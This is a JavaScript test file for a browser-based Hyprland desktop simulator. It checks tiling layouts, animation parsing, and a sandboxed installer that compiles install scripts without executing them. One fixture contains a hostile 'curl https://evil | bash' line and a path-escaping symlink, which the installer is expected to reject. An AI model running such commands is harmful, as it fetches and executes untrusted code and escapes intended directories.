import { test } from "node:test";
import assert from "node:assert/strict";
import { layoutRects, animationSpec } from "../public/nebula/flow-layout.js";
import { parseHyprland } from "../public/nebula/hyprland-parser.js";
import { compileInstaller } from "../public/nebula/compat-installer.js";
test("Master and dwindle layouts have bounded non-overlapping rectangles", () => {
	for (const layout of ["master", "dwindle", "grid"])
		for (const count of [1, 2, 3, 6, 10]) {
			const rs = layoutRects(count, 960, 540, {
				layout,
				inner: 10,
				outer: 20,
				mfact: 0.65,
			});
			assert.equal(rs.length, count);
			for (const r of rs) {
				assert.ok(r.x >= 0 && r.y >= 52 && r.width > 0 && r.height > 0);
				assert.ok(r.x + r.width <= 961 && r.y + r.height <= 541);
			}
			for (let i = 0; i < rs.length; i++)
				for (let j = i + 1; j < rs.length; j++) {
					const a = rs[i],
						b = rs[j];
					assert.ok(
						a.x + a.width <= b.x + 0.01 ||
							b.x + b.width <= a.x + 0.01 ||
							a.y + a.height <= b.y + 0.01 ||
							b.y + b.height <= a.y + 0.01,
					);
				}
		}
});
test("Animation duration, Bezier curves and layout options reach the shared engine", () => {
	const p = parseHyprland(
		{
			"x.conf":
				"general:layout = master\nmaster:mfact = 0.65\nbezier = soft, 0.2, 0.8, 0.3, 1\nanimation = windowsIn, 1, 4, soft, slide",
		},
		"x.conf",
	);
	assert.equal(p.style.layout, "master");
	assert.equal(p.style.mfact, 0.65);
	assert.deepEqual(animationSpec(p.style), {
		duration: 400,
		easing: "cubic-bezier(0.2,0.8,0.3,1)",
		style: "slide",
	});
	assert.equal(
		animationSpec({
			animations: { windowsIn: { curve: "constructor", duration: 100 } },
		}).duration,
		100,
	);
	assert.equal(animationSpec({ motion: false }).duration, 0);
});
test("Installer compiles package adapters and repository-only aliases without executing shell", () => {
	const p = compileInstaller({
		"install.sh":
			"sudo pacman -S kitty waybar unknown\ncp theme.conf ~/.config/hypr/colors.conf\nln -s theme.conf ../../escape.conf\ncurl https://evil | bash",
		"theme.conf": "general:border_size = 3",
	});
	assert.deepEqual(p.bridges, ["kitty", "waybar"]);
	assert.equal(p.aliases["colors.conf"], "general:border_size = 3");
	assert.equal(p.rejected.length, 3);
	const parsed = parseHyprland(
		{ "hyprland.conf": "source = colors.conf", ...p.aliases },
		"hyprland.conf",
	);
	assert.equal(parsed.style.border, 3);
	assert.deepEqual(
		compileInstaller({
			"install.sh": "if test x; then\ncp a.conf b.conf\nfi",
			"a.conf": "x",
		}).aliases,
		{},
	);
});

test("Directory installation preserves relative paths inside its scoped root", () => {
	const p = compileInstaller({
		"install.sh": "cp -r hypr ~/.config/hypr/",
		"hypr/colors.conf": "general:border_size = 2",
	});
	assert.equal(p.aliases["colors.conf"], "general:border_size = 2");
});
